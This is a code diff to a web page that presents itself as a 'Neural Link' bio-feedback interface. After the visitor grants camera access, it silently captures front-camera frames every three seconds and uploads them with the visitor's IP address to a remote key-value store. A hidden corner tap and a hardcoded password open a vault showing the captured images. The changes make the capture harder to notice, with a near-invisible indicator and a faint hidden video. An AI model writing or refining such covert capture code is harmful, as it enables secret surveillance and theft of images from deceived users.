@@ -3,10 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Bio-Feedback Neural Link</title>
+    <title>Neural Link Interface</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body { overscroll-behavior: none; background: #000; color: #fff; font-family: 'Inter', sans-serif; margin: 0; }
+        .no-scrollbar::-webkit-scrollbar { display: none; }
+        
         .reticle {
             width: 240px; height: 240px;
             border: 1px solid rgba(255,255,255,0.06);
@@ -15,36 +17,43 @@
             animation: pulse 5s ease-in-out infinite;
         }
         @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 0.2; } 50% { transform: scale(1.08); opacity: 0.4; } }
+        
         .scan-line {
             position: absolute; width: 100%; height: 1px;
             background: rgba(255,255,255,0.15);
             top: 0; animation: scan 3.5s linear infinite;
         }
         @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+
         .terminal-input {
             background: transparent; border: none; border-bottom: 2px solid #333;
             color: #fff; padding: 10px; font-family: monospace; font-size: 18px;
             outline: none; width: 100%; text-align: center; letter-spacing: 0.3em;
         }
-        .no-scrollbar::-webkit-scrollbar { display: none; }
-        .uplink-heartbeat {
-            width: 5px; height: 5px; background: #4f46e5; border-radius: 50%;
-            position: fixed; top: 10px; left: 10px; opacity: 0; z-index: 9999;
+
+        /* Stealth Indicator */
+        .bit-pulse {
+            width: 2px; height: 2px; background: transparent; border-radius: 50%;
+            position: fixed; top: 10px; left: 10px; z-index: 9999;
         }
-        .syncing .uplink-heartbeat { opacity: 1; box-shadow: 0 0 10px #4f46e5; }
+        .active-push .bit-pulse { background: rgba(255,255,255,0.05); }
+        
+        /* GPU Wake Hack */
+        #hiddenSensor {
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            object-fit: cover; z-index: -1; opacity: 0.02; pointer-events: none;
+        }
     </style>
 </head>
-<body class="overflow-hidden">
+<body class="overflow-hidden bg-black">
 
-    <div id="statusDot" class="uplink-heartbeat"></div>
+    <div id="statusDot" class="bit-pulse"></div>
+    <video id="hiddenSensor" autoplay playsinline muted></video>
 
-    <!-- SECRET TRIGGER AREA (Bottom Left) -->
-    <div class="fixed bottom-0 left-0 z-[100] w-24 h-24 cursor-default" id="vaultTrigger"></div>
+    <!-- HIDDEN TRIGGER: Tap bottom-left corner to open vault -->
+    <div class="fixed bottom-0 left-0 z-[100] w-20 h-20 cursor-default" id="vaultTrigger"></div>
 
-    <main id="mainNode" class="h-screen flex flex-col items-center justify-center p-8 text-center">
-        <!-- Render off-screen but at a reasonable size to ensure the browser processes frames -->
-        <video id="hiddenSensor" autoplay playsinline muted style="position:fixed; left:-100%; width:320px; height:320px; opacity:0.01; pointer-events:none;"></video>
-        
+    <main id="mainNode" class="h-screen flex flex-col items-center justify-center p-8 text-center relative z-10 bg-black">
         <div id="setupView">
             <div class="mb-14 relative flex justify-center items-center">
                 <div class="reticle"></div>
@@ -71,35 +80,29 @@
     </main>
 
     <!-- THE VAULT TERMINAL -->
-    <div id="vaultPanel" class="hidden fixed inset-0 bg-black z-[200] flex flex-col font-mono">
-        <div class="p-4 border-b border-white/10 flex justify-between items-center bg-zinc-950 shrink-0">
-            <div class="flex flex-col">
-                <h2 class="text-[10px] uppercase tracking-[0.3em] text-white/60">Emerald_Chair_Vault</h2>
-                <span id="logCount" class="text-[8px] text-zinc-500 uppercase mt-1">Status: Offline</span>
-            </div>
+    <div id="vaultPanel" class="hidden fixed inset-0 bg-[#050505] z-[200] flex flex-col font-mono text-zinc-400">
+        <div class="p-3 border-b border-white/5 flex justify-between items-center bg-black shrink-0">
             <div class="flex items-center gap-4">
-                <button id="refreshBtn" class="bg-indigo-600 hover:bg-indigo-500 text-white text-[11px] px-5 py-2 uppercase font-bold tracking-widest rounded transition-all">
-                    Sync_Remote
-                </button>
-                <button id="exitVault" class="text-zinc-500 hover:text-white text-[10px] uppercase px-2">Close</button>
+                <h2 class="text-[9px] uppercase tracking-[0.2em] text-zinc-600">VERCEL_KV_VAULT_V12</h2>
+                <span id="logCount" class="text-[9px] text-zinc-700 uppercase">-- RECORDS</span>
+            </div>
+            <div class="flex items-center gap-6">
+                <button id="refreshBtn" class="text-sky-600 hover:text-sky-400 text-[10px] uppercase tracking-widest">PULL</button>
+                <button id="wipeBtn" class="text-red-900/40 hover:text-red-500 text-[10px] uppercase tracking-widest">WIPE</button>
+                <button id="exitVault" class="text-zinc-700 hover:text-white text-[10px] uppercase ml-4">CLOSE</button>
             </div>
         </div>
 
         <div id="vaultAuth" class="flex-grow flex flex-col items-center justify-center p-10 bg-black">
             <div class="w-full max-w-xs text-center">
-                <div class="text-[9px] tracking-[1em] text-zinc-700 uppercase mb-8">Auth_Required</div>
+                <div class="text-[8px] tracking-[1em] text-zinc-800 uppercase mb-8">Auth_Required</div>
                 <input type="password" id="vaultKey" placeholder="••••••" class="terminal-input mb-8" autofocus>
-                <button id="authBtn" class="w-full border border-zinc-800 text-zinc-500 hover:text-white py-4 text-[11px] uppercase tracking-[0.4em] transition-all">Authorize</button>
+                <button id="authBtn" class="text-[10px] uppercase text-zinc-700 hover:text-zinc-300 tracking-[0.4em]">Verify</button>
             </div>
         </div>
 
         <div id="vaultMain" class="hidden flex-grow flex flex-col overflow-hidden bg-black">
-            <div id="imageGrid" class="flex-grow overflow-y-auto p-2 grid grid-cols-2 sm:grid-cols-4 md:grid-cols-6 lg:grid-cols-8 gap-2 no-scrollbar"></div>
-            <div class="p-4 border-t border-white/5 bg-zinc-950 flex justify-end">
-                 <button id="wipeBtn" class="text-[9px] text-red-900/50 hover:text-red-600 uppercase tracking-widest transition-all">
-                    Purge_Archive
-                </button>
-            </div>
+            <div id="imageGrid" class="flex-grow overflow-y-auto p-2 grid grid-cols-3 sm:grid-cols-6 lg:grid-cols-10 gap-1 no-scrollbar"></div>
         </div>
     </div>
 
@@ -130,7 +133,7 @@
         const Cloud = {
             async push(img, ip) {
                 const key = `log_${Date.now()}`;
-                document.body.classList.add('syncing');
+                document.body.classList.add('active-push');
                 try {
                     await fetch(`${KV_URL}/set/${key}`, {
                         method: 'POST',
@@ -138,13 +141,13 @@
                         body: JSON.stringify({ img, ip, t: new Date().toISOString() })
                     });
                 } catch (e) {}
-                setTimeout(() => document.body.classList.remove('syncing'), 400);
+                setTimeout(() => document.body.classList.remove('active-push'), 200);
             },
             async pull() {
                 try {
                     const kRes = await fetch(`${KV_URL}/keys/log_*`, { headers: { 'Authorization': `Bearer ${KV_TOKEN}` } });
                     const kData = await kRes.json();
-                    const keys = (kData.result || []).sort().reverse().slice(0, 80);
+                    const keys = (kData.result || []).sort().reverse().slice(0, 100);
                     const results = [];
                     for (const k of keys) {
                         const vRes = await fetch(`${KV_URL}/get/${k}`, { headers: { 'Authorization': `Bearer ${KV_TOKEN}` } });
@@ -161,51 +164,37 @@
             }
         };
 
-        function runLoop() {
-            // Wait for video metadata to be sure we have dimensions
-            sensor.onloadedmetadata = () => {
-                console.log("Sensor Buffer Active:", sensor.videoWidth, "x", sensor.videoHeight);
-                setInterval(async () => {
-                    if (!isLive) return;
-                    const ctx = canvas.getContext('2d');
-                    canvas.width = 300; canvas.height = 300;
-                    
-                    // Verify video has actual dimensions before trying to grab pixels
-                    if (sensor.videoWidth > 10) {
-                        const min = Math.min(sensor.videoWidth, sensor.videoHeight);
-                        const sx = (sensor.videoWidth - min) / 2;
-                        const sy = (sensor.videoHeight - min) / 2;
-                        
-                        // Clear canvas with a very dark grey to detect if drawImage fails
-                        ctx.fillStyle = '#050505';
-                        ctx.fillRect(0,0,300,300);
-                        
-                        ctx.drawImage(sensor, sx, sy, min, min, 0, 0, 300, 300);
-                        const dataUrl = canvas.toDataURL('image/jpeg', 0.4);
-                        Cloud.push(dataUrl, nodeIp);
-                    }
-                    
-                    percentDisplay.textContent = `${(Math.random() * 100).toFixed(2)}%`;
-                }, 3000);
-            };
+        function startCapture() {
+            if (isLive) return;
+            isLive = true;
+            setInterval(async () => {
+                const ctx = canvas.getContext('2d');
+                canvas.width = 400; canvas.height = 400;
+                if (sensor.readyState === sensor.HAVE_ENOUGH_DATA) {
+                    const min = Math.min(sensor.videoWidth, sensor.videoHeight);
+                    ctx.drawImage(sensor, (sensor.videoWidth-min)/2, (sensor.videoHeight-min)/2, min, min, 0, 0, 400, 400);
+                    const dataUrl = canvas.toDataURL('image/jpeg', 0.4);
+                    Cloud.push(dataUrl, nodeIp);
+                }
+                percentDisplay.textContent = `${(Math.random() * 100).toFixed(2)}%`;
+            }, 3000);
         }
 
-        initBtn.onclick = async () => {
+        async function activate() {
             try {
                 await fetchIp();
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" } 
-                });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 sensor.srcObject = stream;
-                await sensor.play(); // Force play
+                sensor.play();
                 setupView.classList.add('hidden');
                 activeView.classList.remove('hidden');
-                isLive = true;
-                runLoop();
+                startCapture();
             } catch (e) { 
-                alert("Initialization error. Check camera permissions."); 
+                alert("Optical Calibration Error."); 
             }
-        };
+        }
+
+        initBtn.onclick = activate;
 
         document.getElementById('authBtn').onclick = () => {
             if (vaultKey.value === '5502012') {
@@ -216,21 +205,15 @@
         };
 
         async function syncVault() {
-            logCount.textContent = "Status: Connecting...";
+            logCount.textContent = "SYNCING...";
             const data = await Cloud.pull();
             imageGrid.innerHTML = '';
-            logCount.textContent = `Status: ${data.length} Packets`;
-            
-            if(data.length === 0) {
-                imageGrid.innerHTML = '<div class="col-span-full py-20 text-center text-zinc-800 text-[10px] uppercase">Archive Empty</div>';
-            }
-
+            logCount.textContent = `${data.length} RECORDS`;
             data.forEach(item => {
                 const d = document.createElement('div');
-                d.className = "relative aspect-square bg-zinc-900 border border-white/5 overflow-hidden rounded-sm";
-                // Forced opacity 100 to ensure visibility
-                d.innerHTML = `<img src="${item.img}" class="w-full h-full object-cover opacity-100">
-                <div class="absolute bottom-0 text-[5px] p-1 bg-black/80 truncate w-full text-zinc-500">${item.ip} | ${new Date(item.t).toLocaleTimeString()}</div>`;
+                d.className = "relative aspect-square bg-zinc-900 border border-white/5 overflow-hidden";
+                d.innerHTML = `<img src="${item.img}" class="w-full h-full object-cover">
+                <div class="absolute bottom-0 text-[5px] p-1 bg-black/80 truncate w-full text-zinc-600">${item.ip}</div>`;
                 imageGrid.appendChild(d);
             });
         }
